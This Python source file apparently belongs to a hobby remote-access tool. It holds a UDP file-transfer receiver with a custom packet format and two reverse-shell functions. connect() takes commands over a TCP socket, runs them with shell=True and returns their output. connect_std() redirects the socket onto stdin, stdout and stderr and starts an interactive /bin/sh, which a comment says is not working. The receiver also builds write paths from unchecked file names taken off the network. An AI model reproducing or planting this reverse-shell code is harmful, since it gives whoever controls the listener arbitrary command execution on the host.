import os
import socket
import base64
import binascii
import time
import select
import eventlet
import subprocess

from gen_packet import GenPacket


eventlet.monkey_patch()


# These variables should not be modified

# Transmission state
INFORM = "00"
REPLY = "01"
DATA = "02"
SUCCESS = "03"
FAIL = "04"

# File type
NON_FILE = "00"
COMMAND = "01"
TEXT = "02"
IMAGE = "03"
VIDEO = "04"

PLACEHOLDER = "00"


def ToHex(num, length):
    num = hex(num)[2 : ]
    while len(num) < length:
        num = "0" + num
    return num


def decode(b_string):
    msg = base64.b16encode(b_string)
    msg = str(msg, encoding = "utf-8")
    ret = ""
    for i in range(0, len(msg), 2):
        ret += chr(int(msg[i] + msg[i + 1], 16))
    return ret



def file_trans():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('127.0.0.1', 1610))

    print('Bind UDP on 161...')


    state = 0
    total_packet_num = ""
    file_name = ""

    cur_data_index = 0
    time_stamp = time.time()

        
    while True:
        if state == 0:
            # Processing Step 1
            while True:
                data, addr = s.recvfrom(256)
                print('Received from %s:%s.' % addr)


                recvpacket = base64.b16encode(data)
                recvpacket = str(recvpacket, encoding = "utf-8")

                trans_state = recvpacket[58 : 60]
                if trans_state != INFORM:
                    continue

                state = 1                                # switch to state 1
                total_packet_num = recvpacket[66 : 70]    # get packet number field

                hex_file_name = recvpacket[74 : ]
                file_name = ""
                for i in range(0, len(hex_file_name), 2):
                    file_name += chr(int((hex_file_name[i] + hex_file_name[i + 1]), 16))


                if not os.path.exists("/home/zhuo1ang/Workplace/" + file_name):
                    os.mknod("/home/zhuo1ang/Workplace/" + file_name)

                cur_file = open("/home/zhuo1ang/Workplace/" + file_name, 'w')


                # Step 2
                replypacket =  ""
                replypacket += REPLY
                replypacket += NON_FILE
                replypacket += PLACEHOLDER + PLACEHOLDER
                replypacket += total_packet_num
                replypacket += PLACEHOLDER
                replypacket += recvpacket[72 : 74]
                
                for ch in file_name:
                    replypacket += hex(ord(ch))[2 : ]



                s.sendto(GenPacket(replypacket), addr)

                break

        if state == 1:        

            while cur_data_index < int(total_packet_num, 16):

                print(cur_data_index)

                time_stamp = time.time()
                with eventlet.Timeout(3, False):
                    data, addr = s.recvfrom(256)

                if time.time() - time_stamp >= 3:
                    print(time.time() - time_stamp)
                    print("cur_index", cur_data_index)
                    losepacket =  ""
                    losepacket += FAIL
                    losepacket += NON_FILE
                    losepacket += ToHex(cur_data_index, 4)
                    losepacket += total_packet_num
                    losepacket += "01"              # represents packet lose
                    losepacket += ToHex(len(file_name), 2)
                    for ch in file_name:
                        losepacket += ToHex(ord(ch), 2)

                    s.sendto(GenPacket(losepacket), addr)
                    time_stamp = time.time()
                    continue

                # Processing Step 3
                datapacket = base64.b16encode(data)
                datapacket = str(datapacket, encoding = "utf-8")

                trans_state = datapacket[58 : 60]
                file_type = datapacket[60 : 62]
                packet_index = datapacket[62 : 66]
                
                file_name_len = datapacket[70 : 72] # in hex string

                if int(packet_index, 16) != cur_data_index or trans_state != DATA:
                    continue
                
                if file_type != COMMAND: 
                    for i in range(72 + int(file_name_len, 16) * 2, len(datapacket), 2):
                        cur_file.write(chr(int(datapacket[i] + datapacket[i + 1], 16)))
                # else:
                    # Todo
                
                # Step 4
                checkpacket =  ""
                checkpacket += SUCCESS
                checkpacket += file_type     # file type
                checkpacket += packet_index
                checkpacket += total_packet_num
                checkpacket += PLACEHOLDER
                checkpacket += file_name_len

                for ch in file_name:
                    checkpacket += ToHex(ord(ch), 2)

                s.sendto(GenPacket(checkpacket), addr)
                
                cur_data_index += 1
        

            print("File write finished.")
            state = 0
            cur_file.close()
    s.close()
    return


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect(("127.0.0.1", 38297)) 

    while True: 
        command = s.recv(1024) 
        command = decode(command)

        if "exit" in command: 
            s.close()
            break
        elif "cd" in command:
            s.send( b"OK" )
        else: 
            CMD = subprocess.Popen(command, shell = True, 
            stdout = subprocess.PIPE, 
            stderr = subprocess.PIPE, 
            stdin = subprocess.PIPE)
            
            s.send(CMD.stdout.read()) 
            s.send(CMD.stderr.read()) 

# It's not working...            
def connect_std():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 38297))
    
    os.dup2(s.fileno(), 0)
    print(1)
    os.dup2(s.fileno(), 1) # The process stuck here...
    print(2)
    os.dup2(s.fileno(), 2)
    print(3)
    p = subprocess.call(["/bin/sh", "-i"])
    print(4)
    while True:
        print("into")
        command = s.recv(1024) 
        command = decode(command)
       
        # ... 
        # s.send(...)
    return



def main():
    #file_trans()
    #connect_std()
    connect()

